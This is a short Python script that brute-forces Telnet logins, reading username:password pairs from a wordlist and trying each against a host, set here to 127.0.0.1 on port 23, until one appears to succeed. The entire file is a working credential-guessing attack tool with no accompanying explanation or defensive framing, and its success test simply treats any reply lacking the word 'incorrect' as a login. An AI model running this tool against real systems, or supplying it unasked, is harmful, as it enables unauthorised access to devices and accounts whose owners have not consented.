import asyncio
import telnetlib3

async def telnet_bruteforce(host, port, username, password):
    """
    Attempt to brute force Telnet login using the provided credentials.
    :return: True if login is successful, False otherwise.
    """
    try:
        reader, writer = await telnetlib3.open_connection(host=host, port=port)
        
        await asyncio.sleep(1)  # Wait for the login prompt
        writer.write(username + '\n')
        await asyncio.sleep(1)  # Wait for the password prompt
        writer.write(password + '\n')
        await asyncio.sleep(2)  # Wait for potential welcome message

        output = await reader.read(1024)
        if "incorrect" not in output.lower():
            print(f"Telnet login successful with {username}:{password}")
            writer.close()
            return True
        else:
            print(f"Login failed with {username}:{password}")
            writer.close()
            return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False


async def main():
    host = "127.0.0.1"
    port = 23
    with open("wordlists.txt", "r") as f:
        for line in f:
            username, password = line.strip().split(":")
            success = await telnet_bruteforce(host, port, username, password)
            if success:
                break

if __name__ == "__main__":
    asyncio.run(main())
